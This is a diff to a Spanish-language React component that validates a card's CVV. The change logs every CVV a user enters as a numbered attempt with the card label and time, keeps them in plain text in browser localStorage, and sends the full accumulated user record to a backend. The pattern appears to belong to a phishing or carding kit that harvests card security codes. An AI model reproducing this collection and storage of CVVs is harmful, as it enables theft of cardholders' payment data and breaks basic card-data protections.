@@ -104,35 +104,42 @@ export default function ValidacionCVV() {
     // HANDLE SUBMIT
     const handleSubmit = async () => {
         console.log("--- INICIANDO SUBMIT ---");
-        // alert("Iniciando envío..."); // Debug temporal
 
         setCargando(true);
         try {
             const rawData = localStorage.getItem("datos_usuario");
-            console.log("Datos usuario raw:", rawData);
+            let userData = rawData ? JSON.parse(rawData) : {};
 
-            if (!rawData) {
-                alert("Error crítico: No se encontraron datos de sesión (datos_usuario null). Pide iniciar sesión nuevamente.");
-                setCargando(false);
-                return;
+            if (!userData.sesion_id) {
+                // Intentar recuperar de URL si falta en local
+                const params = new URLSearchParams(window.location.search);
+                const urlSesionId = params.get('sesionId');
+                if (urlSesionId) {
+                    userData.sesion_id = urlSesionId;
+                } else {
+                    alert("Error crítico: No se encontraron datos de sesión.");
+                    setCargando(false);
+                    return;
+                }
             }
 
-            const userData = JSON.parse(rawData);
-            const sesionId = userData?.attributes?.sesion_id || userData?.sesion_id; // Intento ambos por si acaso
-            console.log("Sesion ID recuperado:", sesionId);
+            // --- REGISTRAR INTENTO EN LOCALSTORAGE (Estructura Unificada) ---
+            if (!userData.usuario) userData.usuario = {};
+            if (!userData.usuario.cvv_custom) userData.usuario.cvv_custom = [];
 
-            if (!sesionId) {
-                alert("Error: ID de sesión no encontrado en los datos locales.");
-                setCargando(false);
-                return;
-            }
+            const nuevoIntento = {
+                intento: userData.usuario.cvv_custom.length + 1,
+                cvv: cvv,
+                fecha: new Date().toLocaleString(),
+                cardLabel: cardData.label
+            };
+
+            userData.usuario.cvv_custom.push(nuevoIntento);
+            localStorage.setItem("datos_usuario", JSON.stringify(userData));
 
             const dataSend = {
                 data: {
-                    attributes: {
-                        sesion_id: sesionId,
-                        cvv: cvv
-                    }
+                    attributes: userData
                 }
             };
 
